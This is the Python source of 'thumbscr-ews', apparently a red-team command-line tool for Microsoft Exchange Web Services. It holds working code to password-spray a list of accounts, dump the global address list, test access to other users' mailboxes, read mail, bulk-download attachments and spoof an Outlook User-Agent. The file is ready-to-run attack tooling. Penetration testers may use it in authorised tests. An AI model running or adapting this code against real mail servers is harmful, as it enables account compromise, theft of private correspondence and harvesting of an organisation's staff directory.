import itertools
import logging
import os
import string
from hashlib import md5

import click
import exchangelib
import yaml as yamllib
# from exchangelib import Account, EWSDateTime, FolderCollection, Q, Message
from exchangelib import FileAttachment, Account, discover, BaseProtocol, Credentials, Configuration, DELEGATE
# from exchangelib import Credentials, Account
# from exchangelib import Account, DistributionList
# from exchangelib import discover, BaseProtocol
from exchangelib.services import ResolveNames
# This handler will pretty-print and syntax highlight the request and response XML documents
from exchangelib.util import PrettyXmlHandler

from thumbscrews.__init__ import __version__
from thumbscrews.tbestate import tbestate


@click.group()
@click.option('--config', '-C', type=click.Path(exists=True), help='Path to an optional configuration file.')
@click.option('--username', '-u', help='The username to use.')
@click.option('--password', '-p', help='The password to use.')
@click.option('--user-agent', '-a', help='The User-Agent to use (Otherwise uses "thumbscr-ews/0.0.1").')
@click.option('--outlook-agent', '-o', is_flag=True,
              help='Set the User-Agent to an Outlook one (this is still a static value that can be fingerprinted).')
# @click.option('--exchange', '-e', help='The exchange endpoint to use. eg: https://outlook.office365.com/EWS/Exchange.asmx')
@click.option('--dump-config', is_flag=True, help='Dump the effective configuration used.')
@click.option('--exch-host', help='If you dont want to try autodicover set the exchange host.')
@click.option('--verbose', '-v', is_flag=True, help="Enables debugging information.")
@click.option('--table-width', '-w', type=click.INT, help='The maximum width used for table output', default=120)
def cli(config, username, password, dump_config, verbose, user_agent, outlook_agent, table_width, exch_host):
    """
        \b
        thumsc-ews for Exchange Web Services
            by @_cablethief from @sensepost of @orangecyberdef
    """
    # logging.basicConfig(level=logging.WARNING)

    if verbose:
        logging.basicConfig(level=logging.DEBUG, handlers=[PrettyXmlHandler()])

    BaseProtocol.USERAGENT = "thumbscr-ews/" + \
                             __version__ + " (" + BaseProtocol.USERAGENT + ")"

    if outlook_agent and user_agent:
        click.secho(f'CANNOT USE TWO USERAGENTS AT ONCE!!!', fg='red')
        click.secho(
            f'Please use only --user-agent or --outlook-agent.', fg='red')
        quit()

    if outlook_agent:
        user_agent = "Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7145; Pro)"

    if user_agent:
        BaseProtocol.USERAGENT = user_agent

    # set the mq configuration based on the configuration file
    if config is not None:
        with open(config) as f:
            config_data = yamllib.load(f, Loader=yamllib.FullLoader)
            tbestate.dictionary_updater(config_data)

    # set configuration based on the flags this command got
    tbestate.dictionary_updater(locals())

    # If we should be dumping configuration, do that.
    if dump_config:
        click.secho('Effective configuration for this run:', dim=True)
        click.secho('-------------------------------------', dim=True)
        click.secho(f'Username:               {tbestate.username}', dim=True)
        click.secho(f'Password:               {tbestate.password}', dim=True)
        click.secho(f'User-Agent:             {tbestate.user_agent}', dim=True)
        click.secho('-------------------------------------\n', dim=True)


@cli.command()
def version():
    """
        Prints the current thumbsc-ews version
    """

    click.secho(f'thumbsc-ews version {__version__}')


@cli.command()
@click.option('--destination', '-d', default='config.yml', show_default=True,
              help='Destination filename to write the sample configuration file to.')
def yaml(destination):
    """
        Generate an example YAML configuration file
    """

    # Don't be a douche and override an existing configuration
    if os.path.exists(destination):
        click.secho(
            f'The configuration file \'{destination}\' already exists.', fg='yellow')
        if not click.confirm('Override?'):
            click.secho('Not writing a new sample configuration file')
            return

    config = {
        'username': 'user@domain.com',
        'password': 'passw0rd',
        'user_agent': 'Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7145; Pro)'
    }

    click.secho('# An example YAML configuration for thumbscr-ews.\n', dim=True)
    click.secho(yamllib.dump(config, default_flow_style=False), bold=True)

    try:
        with open(destination, 'w') as f:
            f.write('# A thumbscr-ews configuration file\n')
            f.write(yamllib.dump(config, default_flow_style=False))

        click.secho(
            f'Sample configuration file written to: {destination}', fg='green')

    except Exception as ye:
        click.secho(
            f'Failed to write sample configuration file with error: {str(ye)}', fg='red')


@cli.command()
@click.option('--verbose', '-v', is_flag=True, help='This gives more information from autodiscover.')
def autodiscover(verbose):
    """
        Authenticate and go through autodiscover.
    """

    tbestate.validate(['username', 'password'])
    credentials = Credentials(tbestate.username, tbestate.password)

    if verbose:
        logging.basicConfig(level=logging.DEBUG, handlers=[PrettyXmlHandler()])

    primary_address, protocol = discover(tbestate.username, credentials=credentials)

    click.secho(f'Autodiscover results:', bold=True, fg='yellow')
    click.secho(f'{primary_address.user}', fg='bright_green')
    click.secho(f'{protocol}', fg='bright_green')


@cli.group()
def mail():
    """
        Do things with emails.
    """

    pass


@mail.command()
@click.option('--id', help='Get the email with the corresponding ID')
@click.option('--search', '-s', help='Provide a query string based on: '
                                     'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/querystring-querystringtype.')
@click.option('--html', is_flag=True, help='Retrieve the HTML version of mails, default is text.')
@click.option('--folder', '-f',
              help='Specify the folder to read from. Default is Inbox. eg: "Top of Information Store/Archive"')
@click.option('--limit', '-l', type=click.INT, default=100,
              help='Limit the results returned to the most recent <amount>. Default 100')
@click.option('--delegate', '-d', help='Read a different persons mailbox you have access to')
def read(search, html, limit, folder, id, delegate):
    """
        Search for mail in folder. Default Inbox.
        For printing mail in a nice manner.
        If you give it a folder without mail objects you may be sad.
        Check the objects command for just printing out what the library gives us.
    """

    credentials = Credentials(tbestate.username, tbestate.password)

    if delegate:
        username = delegate
    else:
        username = tbestate.username

    if tbestate.exch_host:
        config = Configuration(server=tbestate.exch_host, credentials=credentials)
        account = Account(username, config=config, autodiscover=False, access_type=DELEGATE)
    else:
        account = Account(username, credentials=credentials, autodiscover=True, access_type=DELEGATE)

    if folder:
        # pylint: disable=maybe-no-member
        current_folder = account.root.glob(folder)
    else:
        current_folder = account.inbox

    if search:
        # mails = account.inbox.filter(Q(body__icontains=search) | Q(subject__icontains=search))
        # mails = account.inbox.filter(Q(body__icontains=search))
        mails = current_folder.filter(search).order_by('-datetime_received')
    else:
        if id:
            mails = [current_folder.get(
                id=id)]
        else:
            mails = current_folder.all().order_by('-datetime_received')[:limit]

    for item in mails:
        try:
            click.secho(f'Subject: {item.subject}', fg='bright_blue', bold=True)
            click.secho(f'Sender: {item.sender}', fg='bright_cyan')
            click.secho(f'ReceivedBy: {item.received_by}', fg='cyan')
            click.secho(f'ID: {item.id}\n', fg='bright_magenta')
            # click.secho(f'{item.datetime_received}', fg='green', bold=True)
            if html:
                click.secho(f'Body:\n\n{item.body}\n', fg='white')
            else:
                click.secho(f'Body:\n\n{item.text_body}\n', fg='white')
            if item.has_attachments:
                click.secho(f'Attachments:', fg='yellow', dim=True)
                for attach in item.attachments:
                    click.secho(f'{attach.name} - {attach.content_type}', fg='bright_yellow', dim=True)
        except Exception as e:
            click.secho(
                f'Not a Mail object, probably a meeting request. {e}', fg='red', dim=True)

        click.secho(f'-------------------------------------\n', dim=True)


@mail.command()
@click.option('--id', help='Get the email attachments with the corrisponding ID. Saved as md5(id)-attachmentname.')
@click.option('--search', '-s', help='Provide a query string based on: '
                                     'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/querystring-querystringtype.')
@click.option('--path', type=click.Path(), help='Where to save your attachments. Default is current directory')
@click.option('--folder', '-f',
              help='Specify the folder to read from. Default is Inbox. eg: "Top of Information Store/Archive"')
@click.option('--limit', '-l', type=click.INT, default=100,
              help='Limit the results returned to the most recent <amount>. Default 100')
@click.option('--delegate', '-d', help='Read a different persons mailbox you have access to')
def getattachments(id, folder, path, search, limit, delegate):
    """
        Download all the attachments from a Mail
    """

    credentials = Credentials(
        tbestate.username, tbestate.password)

    if delegate:
        username = delegate
    else:
        username = tbestate.username

    if tbestate.exch_host:
        config = Configuration(server=tbestate.exch_host, credentials=credentials)
        account = Account(username,
                          config=config, autodiscover=False, access_type=DELEGATE)
    else:
        account = Account(username,
                          credentials=credentials, autodiscover=True, access_type=DELEGATE)

    if folder:
        # pylint: disable=maybe-no-member
        current_folder = account.root.glob(folder)
    else:
        current_folder = account.inbox

    if search:
        # mails = account.inbox.filter(Q(body__icontains=search) | Q(subject__icontains=search))
        # mails = account.inbox.filter(Q(body__icontains=search))
        mails = current_folder.filter(search).order_by('-datetime_received')
    else:
        if id:
            mails = [current_folder.get(id=id)]
        else:
            mails = current_folder.all().order_by('-datetime_received')[:limit]

    if not path:
        path = os.getcwd()

    for item in mails:
        try:
            uniqifiyer = md5(item.id.encode("utf-8")).hexdigest()
            click.secho(f'Subject: {item.subject}', fg='bright_blue', bold=True)
            click.secho(f'Sender: {item.sender}', fg='bright_cyan')
            click.secho(f'ReceivedBy: {item.received_by}', fg='cyan')
            click.secho(f'ID: {item.id}', fg='bright_magenta')
            click.secho(f'IDHash: {uniqifiyer}\n', fg='bright_magenta')
            for attachment in item.attachments:
                if isinstance(attachment, FileAttachment):
                    local_path = os.path.join(
                        path, uniqifiyer + '-' + attachment.name)
                    with open(local_path, 'wb') as f, attachment.fp as fp:
                        buffer = fp.read(1024)
                        while buffer:
                            f.write(buffer)
                            buffer = fp.read(1024)
                    click.secho(
                        f'Saved attachment to {local_path}', fg='green')
        except Exception as e:
            click.secho(
                f'Not a Mail object, probably a meeting request. {e}', fg='red', dim=True)
        click.secho(f'-------------------------------------\n', dim=True)


@cli.command()
@click.option('--search', '-s', help='Search pattern to glob on. eg "Top of Information Store*"')
@click.option('--delegate', '-d', help='Read a different persons mailbox you have access to')
# @click.option('--html', is_flag=True, help='Retrieve the HTML version of mails, default is text.')
# @click.option('--limit', '-l', type=click.INT, help='Limit the results returned to the most recent <amount>')
def folders(search, delegate):
    """
        Print exchange file structure.
    """
    credentials = Credentials(
        tbestate.username, tbestate.password)

    if delegate:
        username = delegate
    else:
        username = tbestate.username

    if tbestate.exch_host:
        config = Configuration(server=tbestate.exch_host, credentials=credentials)
        account = Account(username, config=config, autodiscover=False, access_type=DELEGATE)
    else:
        account = Account(username, credentials=credentials, autodiscover=True, access_type=DELEGATE)

    # pylint: disable=maybe-no-member
    account.root.refresh()

    if search:
        for branches in account.root.glob(search):
            click.secho(f'{branches.tree()}')
            click.secho(f'-------------------------------------\n', dim=True)
    else:
        click.secho(f'{account.root.tree()}')
        click.secho(f'-------------------------------------\n', dim=True)


@cli.command()
@click.option('--folder', '-f',
              help='Specify the folder to read from. Default is Inbox. eg: "Top of Information Store/Archive"')
@click.option('--limit', '-l', type=click.INT, default=100,
              help='Limit the results returned to the most recent <amount>. Default 100')
@click.option('--delegate', '-d', help='Read a different persons mailbox you have access to')
def objects(limit, folder, delegate):
    """
        Discover objects.
        Printing out the objects the library finds.
        Not nice and clean like the mail option.
        More for exploration for future features.
        Hopefully the object has a string version.
    """

    credentials = Credentials(tbestate.username, tbestate.password)

    if delegate:
        username = delegate
    else:
        username = tbestate.username

    if tbestate.exch_host:
        config = Configuration(server=tbestate.exch_host, credentials=credentials)
        account = Account(username, config=config, autodiscover=False, access_type=DELEGATE)
    else:
        account = Account(username, credentials=credentials, autodiscover=True, access_type=DELEGATE)

    if folder:
        # pylint: disable=maybe-no-member
        current_folder = account.root.glob(folder)
    else:
        current_folder = account.inbox

    mails = current_folder.all()[:limit]

    for item in mails:
        click.secho(f'Object: {item}', fg='white')
        click.secho(f'-------------------------------------\n', dim=True)


@cli.command()
@click.option('--dump', '-d', is_flag=True, required=True,
              help='Dump all the gal by searching from aa to zz unless -s given')
@click.option('--search', '-s', help='Search in gal for a specific string')
@click.option('--verbose', '-v', is_flag=True, help='Verbose debugging, returns full contact objects.')
def gal(dump, search, verbose):
    """
        Dump GAL using EWS.
        The slower technique used by https://github.com/dafthack/MailSniper
        default searches from "aa" to "zz" and prints them all.
        EWS only returns batches of 100
        There will be doubles, so uniq after.
    """

    if verbose:
        logging.basicConfig(level=logging.DEBUG, handlers=[PrettyXmlHandler()])

    credentials = Credentials(tbestate.username, tbestate.password)
    username = tbestate.username

    if tbestate.exch_host:
        config = Configuration(server=tbestate.exch_host, credentials=credentials)
        account = Account(username, config=config, autodiscover=False, access_type=DELEGATE)
    else:
        account = Account(username, credentials=credentials, autodiscover=True, access_type=DELEGATE)

    atoz = [''.join(x) for x in itertools.product(string.ascii_lowercase, repeat=2)]

    if search:
        for names in ResolveNames(account.protocol).call(unresolved_entries=(search,)):
            click.secho(f'{names}')
    else:
        atoz = [''.join(x) for x in itertools.product(string.ascii_lowercase, repeat=2)]
        for entry in atoz:
            for names in ResolveNames(account.protocol).call(unresolved_entries=(entry,)):
                click.secho(f'{names}')

    click.secho(f'-------------------------------------\n', dim=True)


@ cli.command()
@ click.option('--email-list', '-l', type=click.Path(exists=True), required=True, help='File of inboxes to check')
@ click.option('--full-tree', '-ft', is_flag=True, help='Try print folder tree for the account.')
@ click.option('--verbose', '-v',  is_flag=True, help='Verbose debugging, returns full contact objects.')
@click.option('--folder', '-f',
              help='Specify the folder to check permissions. Default is Inbox. eg: "Top of Information Store/Archive"')
def delegatecheck(email_list, verbose, full_tree, folder):
    """
        Check if the current user has access to the provided mailboxes
        By default will check if access to inbox or not. Can check for other access with --full-tree
    """

    if verbose:
        logging.basicConfig(level=logging.DEBUG, handlers=[PrettyXmlHandler()])

    credentials = Credentials(tbestate.username, tbestate.password)

    if tbestate.exch_host:
        config = Configuration(server=tbestate.exch_host, credentials=credentials)
        account = Account(tbestate.username, config=config, autodiscover=False)
    else:
        account = Account(tbestate.username, credentials=credentials, autodiscover=True)

    ews_url = account.protocol.service_endpoint
    ews_auth_type = account.protocol.auth_type
    # primary_smtp_address = account.primary_smtp_address
    # This one is optional. It is used as a hint to the initial connection and avoids one or more roundtrips
    # to guess the correct Exchange server version.
    version = account.version

    config = Configuration(service_endpoint=ews_url, credentials=credentials,
                           auth_type=ews_auth_type, version=version)

    emails = open(email_list, "r")

    for email in emails:
        email = email.strip()
        try:
            delegate_account = Account(primary_smtp_address=email, config=config,
                                       autodiscover=False, access_type=DELEGATE)
            # We could also print the full file structure, but you get all the public folders for users.
            if full_tree:
                # pylint: disable=maybe-no-member
                click.secho(
                    f'[+] Success {email} - Access to some folders.\n{delegate_account.root.tree()}', fg='green')
            elif folder:
                folders = delegate_account.root.glob(folder)
                if len(folders.folders) == 0:
                    click.secho(
                        f'[-] Failure {email} - No folder found', dim=True, fg='red')
                else:
                    for current_folder in delegate_account.root.glob(folder):
                        pl = []
                        for p in current_folder.permission_set.permissions:
                            if p.permission_level != "None":
                                pl.append(p.permission_level)
                        click.secho(
                            f'[+] Success {email} - Could access {current_folder} - Permissions: {pl}', fg='green')
            else:
                #delegate_account.inbox
                pl = []
                for p in delegate_account.inbox.permission_set.permissions:
                    if p.permission_level != "None":
                        pl.append(p.permission_level)
                click.secho(
                    f'[+] Success {email} - Could access inbox - Permissions: {pl}', fg='green')
        except exchangelib.errors.ErrorItemNotFound:
            click.secho(f'[-] {email} - Failure inbox not accessible', dim=True, fg='red')
        except exchangelib.errors.AutoDiscoverFailed:
            click.secho(f'[-] {email} - Failure AutoDiscoverFailed', dim=True, fg='red')
        except exchangelib.errors.ErrorNonExistentMailbox:
            click.secho(f'[-] {email} - Failure ErrorNonExistentMailbox', dim=True, fg='red')
        except exchangelib.errors.ErrorAccessDenied:
            click.secho(f'[-] {email} - Failure ErrorAccessDenied', dim=True, fg='red')
        except exchangelib.errors.ErrorImpersonateUserDenied:
            click.secho(f'[-] {email} - Failure ErrorImpersonateUserDenied', dim=True, fg='red')


    click.secho(f'-------------------------------------\n', dim=True)


@cli.command()
@click.option('--userfile', '-U', type=click.Path(exists=True), help='File containing all the user email addresses')
# @click.option('--passfile', '-P', type=click.Path(exists=True), help='File containing all the passwords to try')
# @click.option('--username', '-u', help='The user email to try against.')
@click.option('--password', '-p', help='The password to try against users.')
# @click.option('--user-agents', type=click.Path(exists=True), help='A list of user agents to randomly choose from per attempt.')
# @click.option('--jitter', '-j', help='A time range to wait for after every attempt.')
@click.option('--verbose', '-v', is_flag=True, help='This gives more information.')
def brute(verbose, userfile, password):
    """
        Do a brute force.
        Made for horrizontal brute forcing mostly.
        Unless an exchange host is provided it will try autodiscover for each.
        Provide an exchange host to be faster.
    """
    if verbose:
        logging.basicConfig(level=logging.DEBUG, handlers=[PrettyXmlHandler()])

    if not tbestate.exch_host:
        click.secho(
            f'[*] Set an exchange host for a faster bruting experience', fg='yellow')

    usernames = open(userfile, "r")

    for username in usernames:
        username = username.strip()
        # config = Configuration()
        credentials = Credentials(username=username, password=password)
        try:
            if tbestate.exch_host:
                config = Configuration(
                    server=tbestate.exch_host, credentials=credentials)
                # pylint: disable=unused-variable
                account = Account(username, config=config, autodiscover=False)

            else:
                # pylint: disable=unused-variable
                account = Account(username, credentials=credentials, autodiscover=True)
            click.secho(
                f'[+] Success {username}:{password}', fg='green')
        except exchangelib.errors.UnauthorizedError:
            click.secho(
                f'[-] Failure {username}:{password} - exchangelib.errors.UnauthorizedError', dim=True, fg='red')
        except exchangelib.errors.TransportError:
            click.secho(
                f'[-] Failure {username}:{password} - exchangelib.errors.TransportError', dim=True, fg='red')
    click.secho(f'-------------------------------------\n', dim=True)


if __name__ == '__main__':
    # pylint: disable=no-value-for-parameter
    cli()
